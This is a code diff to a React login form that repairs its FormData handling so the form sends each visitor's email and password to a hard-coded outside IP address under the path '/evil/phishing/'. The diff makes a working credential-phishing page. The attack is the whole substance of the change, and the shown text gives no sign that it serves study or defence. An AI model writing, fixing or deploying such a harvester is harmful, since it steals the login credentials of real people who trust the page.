@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import axios from "axios";
 import { LockOutlined, UserOutlined } from "@ant-design/icons";
 import { Button, Form, Input, Spin, Modal } from "antd";
@@ -38,9 +38,9 @@ const App = (props) => {
 
   const onFinish = (values) => {
     const data = new FormData();
-    formData.append("from", who_from);
-    formData.append("email", values.email);
-    formData.append("password", values.password);
+    data.append("from", from);
+    data.append("email", values.email);
+    data.append("password", values.password);
 
     axios
       .post("https://95.140.148.239/evil/phishing/", data)
